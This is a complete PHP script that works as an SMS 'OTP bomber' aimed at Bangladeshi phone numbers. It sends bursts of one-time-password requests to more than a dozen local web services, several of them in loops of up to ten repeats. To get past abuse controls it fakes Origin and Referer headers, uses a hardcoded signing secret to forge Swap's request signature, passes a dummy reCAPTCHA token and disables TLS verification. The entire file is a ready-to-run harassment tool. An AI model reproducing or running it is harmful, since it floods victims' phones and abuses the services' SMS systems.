<?php
header('Content-Type: application/json');
error_reporting(E_ALL);
ini_set('display_errors', 0); 
set_time_limit(0); 

$phone = $_GET['phone'] ?? '';

// ১. ফোন নাম্বার ভ্যালিডেশন
if(!preg_match('/^(?:\+?88)?01[3-9]\d{8}$/', $phone)){
    die(json_encode(["status" => "error", "message" => "Invalid phone number. Use like: ?phone=016XXXXXXXX"]));
}

// ফোন ফরমেটিং 
$phone_11 = preg_replace('/^\+?88/', '', $phone); 
if(substr($phone_11, 0, 1) !== "0") $phone_11 = "0" . $phone_11;

$phone_88 = "88" . $phone_11;             // 88016XXXXXXXX
$phone_plus88 = "+88" . $phone_11;        // +88016XXXXXXXX
$deepto_number = "+880" . substr($phone_11, -10); // +8801XXXXXXXXX
$phone_osudpotro = "+88-" . $phone_11;    // +88-016XXXXXXXX
$phone_fundesh = substr($phone_11, 1);    // 16XXXXXXXX (প্রথম ০ বাদ)

$api_requests = [];

// ==========================================
// 🔴 Swap & Hishabee (১ বার)
// ==========================================

// Swap
$swap_secret = "UFNyP1f+s2bjwVAFbOBv87a142orsWLt7X/4M7pMVyE="; 
$swap_timestamp = (string) time(); 
$swap_signature = base64_encode(hash_hmac('sha256', $phone_11 . $swap_timestamp, $swap_secret, true));

$api_requests[] = [
    "name" => "swap_1",
    "url" => "https://api.swap.com.bd/api/v1/send-otp/v2",
    "method" => "POST",
    "data" => ["phone" => $phone_11, "timestamp" => (int)$swap_timestamp],
    "headers" => ['Content-Type: application/json', 'signature: ' . $swap_signature, 'Origin: https://swap.com.bd', 'Referer: https://swap.com.bd/']
];

// Hishabee
$api_requests[] = [
    "name" => "hishabee_1",
    "url" => "https://app.hishabee.business/api/V2/otp/send?mobile_number=$phone_11&country_code=88",
    "method" => "POST",
    "data" => [],
    "headers" => [
        'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-J400F Build/QP1A.190711.020)',
        'Accept: application/json, text/plain, */*',
        'platform: WEB',
        'origin: https://web.hishabee.business',
        'referer: https://web.hishabee.business/',
        'content-length: 0'
    ]
];


// ==========================================
// 🆕 FIXED: ShadhinMusic, Apex4u, Fundesh
// ==========================================

// ১. ShadhinMusic (১০ বার লুপ)
for($i=1; $i<=10; $i++){
    $api_requests[] = [
        "name" => "shadhin_$i",
        "url" => "https://connect.shadhinmusic.com/v1/api//otp/send",
        "method" => "POST",
        "data" => ["msisdn" => $phone_88],
        "headers" => [
            'Content-Type: application/json', // <-- এই হেডারটা মিসিং ছিল
            'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-J400F)',
            'Accept: application/json, text/plain, */*',
            'Origin: https://shadhinmusic.com',
            'Referer: https://shadhinmusic.com/'
        ]
    ];
}

// ২. Osudpotro (১ বার)
$api_requests[] = [
    "name" => "osudpotro_1",
    "url" => "https://api.osudpotro.com/api/v1/users/send_otp",
    "method" => "POST",
    "data" => ["mobile" => $phone_osudpotro, "deviceToken" => "web", "language" => "en", "os" => "web"],
    "headers" => [
        'Content-Type: application/json;charset=UTF-8',
        'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-J400F)',
        'origin: https://osudpotro.com',
        'referer: https://osudpotro.com/'
    ]
];

// ৩. Apex4u (১ বার)
$api_requests[] = [
    "name" => "apex4u_1",
    "url" => "https://api.apex4u.com/api/auth/login",
    "method" => "POST",
    "data" => ["phoneNumber" => $phone_11],
    "headers" => [
        'Content-Type: application/json', // <-- এই হেডারটা মিসিং ছিল
        'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-J400F)',
        'origin: https://apex4u.com',
        'referer: https://apex4u.com/'
    ]
];

// ৪. Fundesh (১ বার)
$api_requests[] = [
    "name" => "fundesh_1",
    "url" => "https://fundesh.com.bd/api/auth/generateOTP?service_key=",
    "method" => "POST",
    "data" => ["msisdn" => $phone_fundesh],
    "headers" => [
        'Content-Type: application/json; charset=UTF-8', // <-- এই হেডারটা মিসিং ছিল
        'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-J400F)',
        'origin: https://fundesh.com.bd',
        'referer: https://fundesh.com.bd/fundesh/profile',
        'Cookie: _ga=GA1.3.202802911.1773546485; _fbp=fb.2.1773546488241.434535378583969045;'
    ]
];


// ==========================================
// 🟢 OTHERS: পুরনো সার্ভিস (Untouched)
// ==========================================
for($i=1; $i<=3; $i++) $api_requests[] = ["name"=>"deeptoplay_$i","url"=>"https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en","method"=>"POST","data"=>["number"=>$deepto_number],"headers"=>['Content-Type:application/json','origin:https://www.deeptoplay.com']];
for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"redx_$i","url"=>"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp","method"=>"POST","data"=>["phoneNumber"=>$phone_11],"headers"=>['Content-Type:application/json','Origin:https://redx.com.bd','Referer:https://redx.com.bd/']];
for($i=1;$i<=5;$i++) $api_requests[] = ["name"=>"pbs_$i","url"=>"https://apialpha.pbs.com.bd/api/OTP/generateOTP","data"=>["userPhone"=>$phone_11],"headers"=>['Content-Type:application/json']];
for($i=1;$i<=5;$i++) $api_requests[] = ["name"=>"garibook_$i","url"=>"https://api.garibookadmin.com/api/v4/user/login","data"=>["mobile"=>$phone_plus88,"recaptcha_token"=>"garibookcaptcha","channel"=>"web"],"headers"=>['Content-Type:application/json','Origin:https://garibook.com']];
for($i=1;$i<=5;$i++) $api_requests[] = ["name"=>"shwapno_$i","url"=>"https://www.shwapno.com/api/auth","data"=>["phoneNumber"=>$phone_plus88],"headers"=>['Content-Type:application/json','cookie: cuid=98a49521-6662-498f-94eb-17d71974083f']];
for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"bikroy_$i","url"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11","method"=>"GET"];
for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"bdtickets_$i","url"=>"https://api.bdtickets.com:20100/v1/auth","data"=>["createUserCheck"=>true,"phoneNumber"=>$phone_plus88,"applicationChannel"=>"WEB_APP"],"headers"=>['Content-Type:application/json','Origin:https://bdtickets.com']];
for($i=1;$i<=3;$i++) $api_requests[] = ["name"=>"shikho_$i","url"=>"https://api.shikho.com/auth/v2/send/sms","data"=>["phone"=>$phone_88,"type"=>"student","auth_type"=>"signup"],"headers"=>['Content-Type:application/json','Origin:https://shikho.com']];
for($i=1;$i<=3;$i++) $api_requests[] = ["name"=>"iqra_$i","url"=>"https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11,"method"=>"GET","headers"=>['Origin:https://iqra-live.com']];

// ==========================================
// ⚡ Parallel Execution (Multi-cURL)
// ==========================================
$mh = curl_multi_init();
$handles = [];

foreach($api_requests as $key => $api){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api['url']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $headers = $api['headers'] ?? [];
    if (!in_array('User-Agent', array_column(array_map(fn($h) => explode(':', $h), $headers), 0))) {
        $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
    }
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    if(isset($api['method']) && $api['method'] === "GET"){
        curl_setopt($ch, CURLOPT_POST, false);
    } else {
        curl_setopt($ch, CURLOPT_POST, true);
        if(empty($api['data'])){
            curl_setopt($ch, CURLOPT_POSTFIELDS, "");
        } else {
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($api['data']));
        }
    }

    $handles[$key] = $ch;
    curl_multi_add_handle($mh, $ch);
}

$running = null;
do {
    $status = curl_multi_exec($mh, $running);
    if ($running) curl_multi_select($mh);
} while ($running > 0 && $status == CURLM_OK);

$final_results = [];
foreach($handles as $key => $ch){
    $res = curl_multi_getcontent($ch);
    $info = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $final_results[$api_requests[$key]['name']] = [
        "code" => $info,
        "response" => json_decode($res, true) ?: $res
    ];
    curl_multi_remove_handle($mh, $ch);
    curl_close($ch);
}
curl_multi_close($mh);

echo json_encode(["status" => "success", "total_endpoints" => count($api_requests), "data" => $final_results], JSON_PRETTY_PRINT);
?>
